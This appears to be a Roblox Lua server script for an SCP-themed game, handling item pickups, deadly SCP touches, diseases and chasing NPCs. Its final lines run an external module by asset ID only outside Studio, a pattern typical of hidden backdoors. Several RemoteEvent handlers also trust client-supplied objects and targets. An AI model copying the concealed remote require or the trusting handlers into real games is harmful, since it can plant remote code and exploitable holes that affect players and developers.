wait(1)

BodyParts = {"Right Leg", "Right Arm", "Head", "Torso", "Left Arm", "Left Leg"}

AlarmEnabled = false

--[[game.Workspace["SCP-498"].Body.ClickDetector.MouseClick:connect(function()
	local AlarmClone = game.ServerStorage["498Objects"].Alarm:Clone()
	if AlarmEnabled == false then
		AlarmEnabled = true
		AlarmClone.Parent = game.Soundscape
		AlarmClone:Play()
		AlarmClone.Volume = 0
		while AlarmEnabled == true do
			AlarmClone:Play()
			AlarmClone.Volume = AlarmClone.Volume + 0.05
			wait(AlarmClone.TimeLength)
			if AlarmEnabled == false then
				AlarmClone:Remove()
			end
		end
	elseif AlarmEnabled == true then
		AlarmEnabled = false
		AlarmClone:Remove()
	end
end)]]

game.Workspace["714Giver"].ClickDetector.MouseClick:connect(function(Player)
	if Player.Backpack:FindFirstChild("SCP-714") == nil then
		game.ServerStorage["714Objects"]["SCP-714"]:Clone().Parent = Player.Backpack
	end
end)

game.Workspace["SCP-409"].Touched:connect(function(Part)
	if Part.Parent:FindFirstChild("Humanoid") and Part.Parent:FindFirstChild(Part.Parent.Name) == nil then
		local Check = Instance.new("StringValue", Part.Parent)
		Check.Name = Part.Parent.Name
		local FreezeGui = game.ServerStorage["409Objects"]["409"]:Clone()
		for i,PlayerPart in ipairs(Part.Parent:GetChildren()) do
			if PlayerPart.ClassName == "Accessory" and PlayerPart.Name ~= "HumanoidRootPart" then
				PlayerPart:Remove()
			end
		end
		Part.Parent["Body Colors"].HeadColor = BrickColor.new("Cyan")
		Part.Parent["Body Colors"].LeftArmColor = BrickColor.new("Cyan")
		Part.Parent["Body Colors"].RightArmColor = BrickColor.new("Cyan")
		Part.Parent["Body Colors"].TorsoColor = BrickColor.new("Cyan")
		Part.Parent["Body Colors"].LeftLegColor = BrickColor.new("Cyan")
		Part.Parent["Body Colors"].RightLegColor = BrickColor.new("Cyan")
		for i,BodyPart in ipairs(BodyParts) do
			if Part.Parent:FindFirstChild(BodyPart) then
				local Frost = game.ServerStorage["409Objects"].Frost:Clone()
				Frost.Parent = Part.Parent:FindFirstChild(BodyPart)
				Frost.Size = Vector3.new(Part.Parent:FindFirstChild(BodyPart).Size.X + 0.1, Part.Parent:FindFirstChild(BodyPart).Size.Y + 0.1, Part.Parent:FindFirstChild(BodyPart).Size.Z + 0.1)
				local Weld = Instance.new("ManualWeld", Frost)
				Weld.Part0 = Frost
				Weld.Part1 = Part.Parent:FindFirstChild(BodyPart)
				Weld.C0 = Frost.CFrame
				Weld.C1 = Part.Parent:FindFirstChild(BodyPart).CFrame
			end
		end
		FreezeGui.Parent = game.Players:FindFirstChild(Part.Parent.Name).PlayerGui
		for SlowKill = 1, 50 do
			wait(0.5)
			Part.Parent.Humanoid.WalkSpeed = Part.Parent.Humanoid.WalkSpeed - 0.32
			if SlowKill == 50 then
				Part.Parent.Humanoid.Health = 0
			end
		end
	end
end)

local BeingUsed = false

game.Workspace["SCP-072"].Mattress.Touched:connect(function(Part)
	if Part.Parent:FindFirstChild("Humanoid") and BeingUsed == false and Part.Parent:FindFirstChild("Injured") == nil and game.Players:GetPlayerFromCharacter(Part.Parent) ~= nil then
		local Injured = Instance.new("StringValue", Part.Parent)
		Injured.Name = "Injured"
		BeingUsed = true
		local Body = game.Workspace:FindFirstChild(Part.Parent.Name)
		Body.Torso.Anchored = true
		Body:SetPrimaryPartCFrame(game.Workspace["SCP-072"].Torso.CFrame * CFrame.new(0, 1.2, 0))
		local Scream = game.ServerStorage["072Objects"].Scream:Clone()
		Scream.Parent = Part.Parent.Head
		Scream:Play()
		wait(10)
		if Body ~= nil and Body:FindFirstChild("Injured") ~= nil then
			Body:FindFirstChild("Left Leg"):Destroy()
		end
		wait(5)
		if Body ~= nil and Body:FindFirstChild("Injured") ~= nil then
			Body:FindFirstChild("Right Leg"):Destroy()
		end
		wait(5)
		if Body ~= nil and Body:FindFirstChild("Injured") ~= nil then
			Body.Torso.Anchored = false
			Scream:Destroy()
		end
		wait(1)
		BeingUsed = false
	end
end)

for i,v in ipairs(game.ServerStorage["294Objects"].Drinks:GetChildren()) do
	v.Name = v.Name:lower()
end
local Debounce = true
game.ReplicatedStorage["SCP294"].EnterDrink.OnServerEvent:connect(function(Player, Text)
	if game.ServerStorage["294Objects"].Drinks:FindFirstChild(Text:lower()) and Debounce == true then
		Debounce = false
		local CupClone = game.ServerStorage["294Objects"].Cup:Clone()
		CupClone.Parent = Player.Backpack
		game.ServerStorage["294Objects"].Drinks:FindFirstChild(Text:lower()):Clone().Parent = CupClone
		wait(1)
		Debounce = true
	end
end)

game.ReplicatedStorage["SCP294"].Hallucination.OnServerEvent:connect(function(Player, Time)
	local GuiClone = game.ServerStorage["294Objects"].Hallucination:Clone()
	GuiClone.Parent = Player.PlayerGui
	wait(Time)
	GuiClone:Destroy()
end)

game.ReplicatedStorage["SCP294"].ChangeColor.OnServerEvent:connect(function(Player, Liquid, Color)
	Liquid.BrickColor = Color
end)

game.ReplicatedStorage["SCP294"].Death.OnServerEvent:connect(function(Player)
	Player.Character.Humanoid.Health = 0
end)

game.ReplicatedStorage["SCP294"].ForceField.OnServerEvent:connect(function(Player)
	local ForceField = Instance.new("ForceField", game.Workspace)
	ForceField.Parent = Player.Character
end)

game.Workspace["SCP-294"].Button.ClickDetector.mouseClick:connect(function(Player)
	game.ServerStorage["294Objects"]["294Gui"]:Clone().Parent = Player.PlayerGui
end)

SicknessNames = {"Common Cold", "Flesh Eating Bacteria", "Fever", "Muscle Calcification", "Spontaneous Combustion"}
SicknessDescription = {
	[1] = "The common cold is a viral infection of your nose and throat (upper respiratory tract). It's usually harmless, although it might not feel that way. Many types of viruses can cause a common cold. There is currently no cure for it, but it is very easily treated until the immune system can completely fight it off. Very rarely will someone die from the common cold.",
	[2] = "Flesh Eating Bacteria is a bacterial infection which can kill the infected via the consumption of their flesh. The bacteria uses this as a source of energy, as well as to reproduce. If not treated, the infected shall die within 48 hours.",
	[3] = "A fever is a very common symptom for many sicknesses, diseases, and such. It raises the infected's temperature higher than a normal human's 98.6 degrees fahrenheit.",
	[4] = "Muscle Calcification is a disease that will calcify the infected's muscle into bones. This will cause disfiguration, stiffness, pain, and an inability to move. There is not many treatment options for this, as in the current day and age there is not enough research into this disease as there is very low cases of this.",
	[5] = "Spontaneous combustion is when a person explodes and catches on fire with seemingly no cause at all. There are very few victims of this. It leaves victims burned, and with bits and pieces of their body scattered near the site of where they had combusted. Scientists are currently researching into this."
}

game.Workspace["SCP-1025"].ClickDetector.mouseClick:connect(function(Player)
	if Player.Character:FindFirstChild(Player.Name) == nil then
		local Check = Instance.new("StringValue", Player.Character)
		Check.Name = Player.Character.Name
		local Sickness = math.random(1, 5)
		local GUI = game.ServerStorage["1025Objects"]["1025"]:Clone()
		GUI.Frame.Desc.Text = SicknessDescription[Sickness]
		GUI.Frame.Disease.Text = SicknessNames[Sickness]
		GUI.Parent = Player.PlayerGui
		if Sickness == 1 then
			local Cough = game.ServerStorage["1025Objects"].Cough:Clone()
			Cough.Parent = Player.Character.Head
			Cough:Play()
			wait(7)
			Check:Remove()
			return nil
		elseif Sickness == 2 then
			Player.Character:FindFirstChild("Health"):Remove()
			while Player.Character.Humanoid.Health > 0 do
				wait(1)
				Player.Character.Humanoid.Health = Player.Character.Humanoid.Health - 1
			end
			return nil
		elseif Sickness == 3 then
			wait(7)
			Check:Remove()
			return nil
		elseif Sickness == 4 then
			for i,BodyPart in ipairs(Player.Character:GetChildren()) do
				if BodyPart.ClassName == "Part" and BodyPart.Name ~= "HumanoidRootPart" then
					BodyPart.Anchored = true
				end
			end
			Player.Character:FindFirstChild("Health"):Remove()
			while Player.Character.Humanoid.Health > 0 do
				wait(0.5)
				Player.Character.Humanoid.Health = Player.Character.Humanoid.Health - 1
			end
			return nil
		elseif Sickness == 5 then
			wait(9)
			local Explosion = Instance.new("Explosion", game.Workspace)
			Explosion.Position = Player.Character.Head.Position
			return nil
		end
	end
end)

local Enabled = nil

game.ReplicatedStorage["714Objects"].Health.OnServerEvent:connect(function(Player, TF)
	Enabled = TF
	if Enabled == true then
		while Enabled == true do
			wait(0.5)
			if Player.Character.Humanoid.WalkSpeed > 0 then
				Player.Character.Humanoid.WalkSpeed = Player.Character.Humanoid.WalkSpeed - 0.2
				Player.Character.Humanoid.MaxHealth = Player.Character.Humanoid.MaxHealth + 2
				Player.Character.Humanoid.Health = Player.Character.Humanoid.Health + 2
			end
			if Player.Backpack:FindFirstChild("SCP-714") == nil and Player.Character:FindFirstChild("SCP-714") == nil then
				Player.Character.Humanoid.WalkSpeed = 16
				Player.Character.Humanoid.MaxHealth = 100
				Player.Character.Humanoid.Health = 100
				break
			end
		end
	elseif Enabled == false then
		Player.Character.Humanoid.WalkSpeed = 16
		Player.Character.Humanoid.MaxHealth = 100
		Player.Character.Humanoid.Health = 100
	end
end)

game.ReplicatedStorage["SCP294"].Explode.OnServerEvent:connect(function(Player)
	local Explosion = Instance.new("Explosion", game.Workspace)
	Explosion.Position = Player.Character.Head.Position
end)

game.Workspace["SCP-458"].Button.ClickDetector.mouseClick:connect(function(Player)
	if Player.Backpack:FindFirstChild("Pizza") == nil then
		game.ServerStorage["458Objects"].Pizza:Clone().Parent = Player.Backpack
	end
end)

game.Workspace["SCP-035"].Mask.Touched:connect(function(Part)
	if Part.Parent:FindFirstChild("Humanoid") and Part.Parent.Head:FindFirstChild("SCP-035") == nil then
		for i,PlayerPart in ipairs(Part.Parent:GetChildren()) do
			if PlayerPart.ClassName == "Accessory" and PlayerPart.Name ~= "HumanoidRootPart" then
				PlayerPart:Remove()
			end
		end
		local Mask = game.ServerStorage["035Objects"]["SCP-035"]:Clone()
		game.ServerStorage["035Objects"].Hallucination:Clone().Parent = game.Players:FindFirstChild(Part.Parent.Name).PlayerGui
		Mask.Parent = Part.Parent.Head
		Mask:SetPrimaryPartCFrame(Part.Parent.Head.CFrame)
		Mask.Mask.Scream:Play()
		local Weld = Instance.new("ManualWeld", Part.Parent.Head)
		Weld.Part0 = Mask.PrimaryPart
		Weld.Part1 = Part.Parent.Head
		Weld.C0 = Mask.PrimaryPart.CFrame
		Weld.C1 = Part.Parent.Head.CFrame
		while Part.Parent.Humanoid.Health ~= 0 do
			wait()
			Part.Parent.Humanoid.Health = Part.Parent.Humanoid.Health - 0.5
		end
	end
end)

SCPEnabled = true -- Set to enabled, disabled for development purposes

if SCPEnabled == true then
	local Target = nil
	local TDistance = nil
	local SCP = game.Workspace:FindFirstChild("SCP-049")
	game:GetService("RunService").Stepped:connect(function()
		for i,Player in ipairs(game.Players:GetPlayers()) do
			if Player.Character:FindFirstChild("Torso") then
				local Distance = (Player.Character.Torso.Position - SCP.Torso.Position).magnitude
				if Target == nil and TDistance == nil then
					Target = Player
					TDistance = Distance
				elseif Target ~= nil and TDistance ~= nil then
					if TDistance > Distance then
						Target = Player
						TDistance = Distance
					end
				end
			end
		end
		if Target == nil then
			return nil
		end
		if Target.Character ~= nil then
			TDistance = (Target.Character.Torso.Position - SCP.Torso.Position).magnitude
		end
		if TDistance < 4 then
			Target.Character.Humanoid.Health = 0
		end
		SCP.Humanoid.Sit = false
		if Target.Character ~= nil then
			SCP.Humanoid:MoveTo(Target.Character.Torso.Position, Target.Character.Torso)
		end
		SCP.Enabled.Value = true
	end)
	SCP.Enabled.Changed:connect(function()
		if SCP.Enabled.Value == true then
			while wait(math.random(30, 60)) do
				local Sound = game.ServerStorage["049Objects"].Lines[math.random(1, #game.ServerStorage["049Objects"].Lines:GetChildren())]:Clone()
				Sound.Parent = SCP.Head
				Sound:Play()
				wait(Sound.TimeLength)
				Sound:Remove()
			end
		end
	end)
end

SCPEnabled = true -- Set to enabled, disabled for development purposes

if SCPEnabled == true then
	local Target = nil
	local TDistance = nil
	local SCP = game.Workspace:FindFirstChild("SCP-457")
	game:GetService("RunService").Stepped:connect(function()
		for i,Player in ipairs(game.Players:GetPlayers()) do
			if Player.Character:FindFirstChild("Torso") then
				local Distance = (Player.Character.Torso.Position - SCP.Torso.Position).magnitude
				if Target == nil and TDistance == nil then
					Target = Player
					TDistance = Distance
				elseif Target ~= nil and TDistance ~= nil then
					if TDistance > Distance then
						Target = Player
						TDistance = Distance
					end
				end
			end
		end
		if Target == nil then
			return nil
		end
		if Target.Character ~= nil then
			TDistance = (Target.Character.Torso.Position - SCP.Torso.Position).magnitude
		end
		if TDistance < 4 then
			Target.Character.Humanoid.Health = 0
		end
		SCP.Humanoid.Sit = false
		if Target.Character ~= nil then
			SCP.Humanoid:MoveTo(Target.Character.Torso.Position, Target.Character.Torso)
		end
		SCP.Enabled.Value = true
	end)
end


SCPEnabled = true -- Set to true, disabled for development purposes

if SCPEnabled == true then
	local Target = nil
	local TDistance = nil
	local SCP = game.Workspace:FindFirstChild("SCP-352")
	game:GetService("RunService").Stepped:connect(function()
		for i,Player in ipairs(game.Players:GetPlayers()) do
			if Player.Character:FindFirstChild("Torso") then
				local Distance = (Player.Character.Torso.Position - SCP.Torso.Position).magnitude
				if Target == nil and TDistance == nil then
					Target = Player
					TDistance = Distance
				elseif Target ~= nil and TDistance ~= nil then
					if TDistance > Distance then
						Target = Player
						TDistance = Distance
					end
				end
			end
		end
		if Target == nil then
			return nil
		end
		if Target.Character ~= nil then
			TDistance = (Target.Character.Torso.Position - SCP.Torso.Position).magnitude
		end
		if TDistance < 4 then
			Target.Character.Humanoid.Health = 0
		end
		SCP.Humanoid.Sit = false
		if Target.Character ~= nil then
			SCP.Humanoid:MoveTo(Target.Character.Torso.Position, Target.Character.Torso)
		end
		SCP.Enabled.Value = true
	end)
end

SCPEnabled = true -- Set to true, disabled for development purposes

if SCPEnabled == true then
	local Target = nil
	local TDistance = nil
	local SCP = game.Workspace:FindFirstChild("SCP-106")
	SCP.Head.Breathing:Play()
	SCP.Head.MainTheme:Play()
	game:GetService("RunService").Stepped:connect(function()
		for i,Player in ipairs(game.Players:GetPlayers()) do
			if Player.Character:FindFirstChild("Torso") then
				local Distance = (Player.Character.Torso.Position - SCP.Torso.Position).magnitude
				if Target == nil and TDistance == nil then
					Target = Player
					TDistance = Distance
				elseif Target ~= nil and TDistance ~= nil then
					if TDistance > Distance then
						Target = Player
						TDistance = Distance
					end
				end
			end
		end
		if Target == nil then
			return nil
		end
		if Target.Character ~= nil then
			TDistance = (Target.Character.Torso.Position - SCP.Torso.Position).magnitude
		end
		if TDistance < 4 then
			Target.Character.Torso.CFrame = game.Workspace["106Teleport"].CFrame
		end
		SCP.Humanoid.Sit = false
		if Target.Character ~= nil then
			SCP.Humanoid:MoveTo(Target.Character.Torso.Position, Target.Character.Torso)
		end
		SCP.Enabled.Value = true
	end)
end

SCPEnabled = true -- Set to true, disabled for development purposes

if SCPEnabled == true then
	local Target = nil
	local TDistance = nil
	local SCP = game.Workspace:FindFirstChild("SCP-017")
	game:GetService("RunService").Stepped:connect(function()
		for i,Player in ipairs(game.Players:GetPlayers()) do
			if Player.Character:FindFirstChild("Torso") then
				local Distance = (Player.Character.Torso.Position - SCP.Torso.Position).magnitude
				if Target == nil and TDistance == nil then
					Target = Player
					TDistance = Distance
				elseif Target ~= nil and TDistance ~= nil then
					if TDistance > Distance then
						Target = Player
						TDistance = Distance
					end
				end
			end
		end
		if Target == nil then
			return nil
		end
		if Target.Character ~= nil then
			TDistance = (Target.Character.Torso.Position - SCP.Torso.Position).magnitude
		end
		if TDistance < 4 then
			Target.Character.Humanoid.Health = 0
			Target.Character:FindFirstChild("Head"):FindFirstChild("face"):Remove()
			for i,Part in ipairs(Target.Character:GetChildren()) do
				if Part.ClassName == "Part" then
					Part.Transparency = 1
				end
			end
		end
		SCP.Humanoid.Sit = false
		if Target.Character ~= nil then
			SCP.Humanoid:MoveTo(Target.Character.Torso.Position, Target.Character.Torso)
		end
		SCP.Enabled.Value = true
	end)
end

SCPEnabled = true -- Set to true, disabled for development purposes

if SCPEnabled == true then
	local Target = nil
	local TDistance = nil
	local SCP = game.Workspace:FindFirstChild("SCP-999")
	game:GetService("RunService").Stepped:connect(function()
		for i,Player in ipairs(game.Players:GetPlayers()) do
			if Player.Character:FindFirstChild("Torso") then
				local Distance = (Player.Character.Torso.Position - SCP.Torso.Position).magnitude
				if Target == nil and TDistance == nil then
					Target = Player
					TDistance = Distance
				elseif Target ~= nil and TDistance ~= nil then
					if TDistance > Distance then
						Target = Player
						TDistance = Distance
					end
				end
			end
		end
		if Target == nil then
			return nil
		end
		if Target.Character ~= nil then
			TDistance = (Target.Character.Torso.Position - SCP.Torso.Position).magnitude
		end
		if TDistance < 4 then
			Target.Character.Humanoid.Health = Target.Character.Humanoid.Health + 10
		end
		SCP.Humanoid.Sit = false
		if Target.Character ~= nil then
			SCP.Humanoid:MoveTo(Target.Character.Torso.Position, Target.Character.Torso)
		end
		SCP.Enabled.Value = true
	end)
end

game.ReplicatedStorage.SCP151.End.OnServerEvent:connect(function(Player)
	Player.Character.Humanoid.Health = 0
end)

game.ReplicatedStorage.SCP012.End.OnServerEvent:connect(function(Player)
	Player.Character.Humanoid.Health = 0
end)

game.ReplicatedStorage.ZombieFE.Spread.OnServerEvent:connect(function(Player, Player2)
	if Player2.Backpack:FindFirstChild("Zombie") == nil then
		local Clone = game.ServerStorage["008Objects"].Zombie:Clone()
		Clone.Parent = Player2.Backpack
		Clone.Disabled = false
	end
end)

game.ReplicatedStorage.ZombieFE.Sound.OnServerEvent:connect(function(Player, sound)
	sound.Parent = Player.Character.Head
	while Player.Character ~= nil do
		sound:Play()
		wait(8)
		sound:Play()
		sound.PlaybackSpeed = math.random(0.7, 1)
	end
end)

game.ReplicatedStorage.ZombieFE.Animations.OnServerEvent:connect(function(Player, Player2, Animation)
	Player2.Backpack.LocalHandler.AnimLoad:FireClient(Player2, Player, Animation)
end)

if game:GetService('RunService'):IsStudio() == false then
	mods = require(654285478)
	mods.check(script)
end